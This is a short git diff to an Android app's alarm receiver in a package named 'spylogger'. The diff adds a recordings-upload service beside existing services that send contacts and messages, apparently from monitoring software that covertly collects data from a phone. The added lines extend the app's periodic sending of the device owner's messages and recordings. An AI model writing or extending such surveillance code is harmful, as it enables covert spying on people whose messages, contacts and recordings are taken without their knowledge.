@@ -10,6 +10,7 @@ import com.gravatasufoca.spylogger.model.Configuracao;
 import com.gravatasufoca.spylogger.repositorio.RepositorioConfiguracao;
 import com.gravatasufoca.spylogger.repositorio.impl.RepositorioConfiguracaoImpl;
 import com.gravatasufoca.spylogger.services.SendContatosService;
+import com.gravatasufoca.spylogger.services.SendGravacoesService;
 import com.gravatasufoca.spylogger.services.SendMensagensService;
 import com.gravatasufoca.spylogger.utils.Utils;
 
@@ -33,6 +34,9 @@ public class Alarm extends BroadcastReceiver{
 
 					SendMensagensService sendMensagensService = new SendMensagensService(context, null);
 					sendMensagensService.enviarTopicos();
+
+					SendGravacoesService sendGravacoesService=new SendGravacoesService(context,null);
+					sendGravacoesService.enviarTopicos();
 				}
 			}
 
